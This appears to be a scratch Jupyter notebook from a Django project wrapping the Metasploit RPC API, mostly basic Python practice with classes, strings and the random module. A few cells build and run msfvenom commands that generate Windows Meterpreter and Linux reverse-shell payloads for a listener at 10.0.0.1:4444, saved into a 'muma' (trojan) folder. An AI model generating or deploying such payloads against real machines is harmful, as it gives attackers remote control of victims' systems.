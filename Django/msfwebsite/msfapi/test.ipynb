{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python385jvsc74a57bd09f0194299e911b6a22f0cd3d1c9a66c991d39f48b249be23f24104e40900e329",
   "display_name": "Python 3.8.5 64-bit ('base': conda)"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class a:\n",
    "   \n",
    "    var=[\"a\",\"b\",\"c\"]\n",
    "    def __init__(self,host,port):\n",
    "        \n",
    "        self.var[0]=host\n",
    "        self.var[1]=port\n",
    "        \n",
    "\n",
    "  \n",
    "x =a(\"127.0.0.1\",\"100\")\n",
    "x.var\n",
    "type(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "class msflogin:\n",
    "    options = [\"auth.login\",\"msf\",\"msf\"]\n",
    "    def __init__(self,host,port,user,passwd):\n",
    "        self.options[1]=user\n",
    "        self.options[2]=passwd\n",
    "        self.host=host\n",
    "        self.port=port\n",
    "#实例化a\n",
    "a=msflogin(\"127.0.0.1\",\"80\",\"admin\",\"123\")\n",
    "\n",
    "\n",
    "\n",
    "print(a.options,\" \" ,a.host,\" \",a.port)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class msflogin:\n",
    "    #配置\n",
    "    options ={ \n",
    "        \"login\":[\"auth.login\",\"Username\",\"Password\"],\n",
    "        \"console\":{\n",
    "                \"create\":[ \"console.create\", \"<token>\"],\n",
    "        }\n",
    "\n",
    "\n",
    "\n",
    "    \n",
    "    }\n",
    "\n",
    "\n",
    "    headers = {\"Content-type\" : \"binary/message-pack\"}\n",
    "    def __init__(self,host,port,user,passwd):\n",
    "        \n",
    "        self.host=host\n",
    "        self.port=port\n",
    "        self.options[\"login\"][1]=user\n",
    "        self.options[\"login\"][2]=passwd\n",
    "        self.options['console'][\"create\"][1]=\"asddddddddddd\"\n",
    "#实例化a\n",
    "a=msflogin(\"127.0.0.1\",\"80\",\"admin\",\"123\")\n",
    "\n",
    "\n",
    "\n",
    "print(a.options['console']['create'][1])    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class a:\n",
    "    class b:\n",
    "        c=1\n",
    "\n",
    "ca=a()\n",
    "a.b.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "a=1\n",
    "b=1\n",
    "c=[a,b]\n",
    "print(c)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "a={b'consoles': [{b'id': b'1', b'prompt': b'msf6 > ', b'busy': False}, {b'id': b'2', b'prompt': b'msf6 > ', b'busy': False}]}\n",
    "dic=a\n",
    "list=dic[b'consoles']\n",
    "for item in list:\n",
    "    print(item[b'id'].decode())\n",
    "    #用int转化为数字 或则decode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print('''asd\n",
    "asdasda''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "def a():\n",
    "    print(\"hello\")\n",
    "a()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "ip=\"10.0.0.1\"\n",
    "port=4444\n",
    "name=\"hello.exe\"\n",
    "str=\"msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%d x >\"%(ip,port)\n",
    "str1=\"/tmp/static/muma/%s\"%(name)\n",
    "str=str+str1\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o  tmp/hello\n"
     ]
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "metadata": {},
     "execution_count": 18
    }
   ],
   "source": [
    "#msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x >文件路径/文件名=\"\"\n",
    "import os\n",
    "ip=\"10.0.0.1\"\n",
    "port=4444\n",
    "name=\"hello\"\n",
    "str3=\"msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe -o \"%(ip,port)\n",
    "\n",
    "str4=\" tmp/%s\"%(name)\n",
    "str=str3+str4\n",
    "print(str)\n",
    "os.system(\"mkdir tmp\")\n",
    "os.system(str)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "21在这\ns21\na 1\n"
     ]
    }
   ],
   "source": [
    "def a(a,s12=\"\",s21=\"\"):\n",
    "    print(s12,end=\"\\n\")\n",
    "    print(\"s21\"+s21)\n",
    "    print(\"a\",a)\n",
    "a(1,\"21在这\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "TypeError",
     "evalue": "fun() missing 1 required positional argument: 'c'",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-51-fded6766ee44>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mfun\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mb\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"hello\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mfun\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m2\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m: fun() missing 1 required positional argument: 'c'"
     ]
    }
   ],
   "source": [
    "def fun(a,b,c):\n",
    "    print(\"hello\")\n",
    "fun(1,2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "TypeError",
     "evalue": "printinfo() takes 1 positional argument but 2 were given",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-56-7c89377fcd3b>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      7\u001b[0m \u001b[0;31m# 调用printinfo 函数\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m \u001b[0mdic\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m{\u001b[0m\u001b[0;34m'A'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;36m2\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'B'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;36m3\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 9\u001b[0;31m \u001b[0mprintinfo\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdic\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m: printinfo() takes 1 positional argument but 2 were given"
     ]
    }
   ],
   "source": [
    "def printinfo( arg1, **vardict ):\n",
    "   \"打印任何传入的参数\"\n",
    "   print (\"输出: \")\n",
    "   print (arg1)\n",
    "   print (vardict)\n",
    " \n",
    "# 调用printinfo 函数\n",
    "dic={'A': 2, 'B': 3}\n",
    "printinfo(1, dic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "['Google', 'Runoob', 'Taobao', 'Facebook']\n"
     ]
    }
   ],
   "source": [
    "txt = \"Google#Runoob#Taobao#Facebook\"\n",
    " \n",
    "# 第二个参数为 1，返回两个参数列表\n",
    "x = txt.split(\"#\", 3)\n",
    " \n",
    "print(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "now you are inside the hi() function\nnow you are in the greet() function\nnow you are in the welcome() function\nnow you are back in the hi() function\n"
     ]
    }
   ],
   "source": [
    "\n",
    "def hi(name=\"yasoob\"):\n",
    "    print(\"now you are inside the hi() function\")\n",
    " \n",
    "    def greet():\n",
    "        return \"now you are in the greet() function\"\n",
    " \n",
    "    def welcome():\n",
    "        return \"now you are in the welcome() function\"\n",
    " \n",
    "    print(greet())\n",
    "    print(welcome())\n",
    "    print(\"now you are back in the hi() function\")\n",
    " \n",
    "hi()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "now you are inside the hi() function\n"
     ]
    }
   ],
   "source": [
    "def hi(name=\"yasoob\"):\n",
    "    print(\"now you are inside the hi() function\")\n",
    " \n",
    "    def greet():\n",
    "        return \"now you are in the greet() function\"\n",
    "hi()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "139788503577840\n139788503577840\n"
     ]
    }
   ],
   "source": [
    "a='hello'\n",
    "b='hello'\n",
    "print(id(a))\n",
    "print(id(b))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'0123456789'"
      ]
     },
     "metadata": {},
     "execution_count": 43
    }
   ],
   "source": [
    "import string\n",
    "string.digits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "TypeError",
     "evalue": "choice() got an unexpected keyword argument 'k'",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-52-473b3d8fe547>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mrandom\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrandom\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mchoice\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'choice'\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m2\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m: choice() got an unexpected keyword argument 'k'"
     ]
    }
   ],
   "source": [
    "import random\n",
    "print(random.choice('choice',k=2)) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "0.5008739428252665"
      ]
     },
     "metadata": {},
     "execution_count": 31
    }
   ],
   "source": [
    "import random  \n",
    "a = random.random()\n",
    "a\n",
    "#(0,1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "8\n5\n"
     ]
    }
   ],
   "source": [
    "import random  \n",
    "print(random.randint(1,10))\n",
    "print(random.randint(1,10))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "5\n10\n5\n0\n"
     ]
    }
   ],
   "source": [
    "print (random.randrange(0, 11, 5))\n",
    "print (random.randrange(0, 11, 5))\n",
    "print (random.randrange(0, 11, 5))\n",
    "print (random.randrange(0, 11, 5))\n",
    "\n",
    "\n",
    " #从指定范围内，按指定基数递增的集合中 获取一个随机数"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\\'()*+,-./:;<=>?@[\\\\]^_`{|}~ \\t\\n\\r\\x0b\\x0c'"
      ]
     },
     "metadata": {},
     "execution_count": 48
    }
   ],
   "source": [
    "string.printable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "pjipf\n[3, 3, 3, 3, 3]\n[1, 4, 2, 1, 5]\n[1, 1, 1, 1, 1]\n"
     ]
    }
   ],
   "source": [
    "import random\n",
    "a = [1,2,3,4,5]\n",
    "b=\"aafahfaifpafpasjf\"\n",
    "#1\n",
    "print(\"\".join(random.choices(b,k=5)))\n",
    "#2\n",
    "print(random.choices(a,weights=[0,0,1,0,0],k=5))\n",
    "#3\n",
    "print(random.choices(a,weights=[1,1,1,1,1],k=5))\n",
    "#4\n",
    "print(random.choices(a,cum_weights=[1,1,1,1,1],k=5))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "cw3x8U929qk7uF\n"
     ]
    }
   ],
   "source": [
    "import string\n",
    "import random\n",
    "#随机生成密码\n",
    "\n",
    "print(\"\".join(random.choices(string.ascii_letters+string.digits,k=random.randint(8,19))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"
      ]
     },
     "metadata": {},
     "execution_count": 56
    }
   ],
   "source": [
    "string.ascii_uppercase"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'abcdefghijklmnopqrstuvwxyz'"
      ]
     },
     "metadata": {},
     "execution_count": 57
    }
   ],
   "source": [
    "string.ascii_lowercase"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ]
}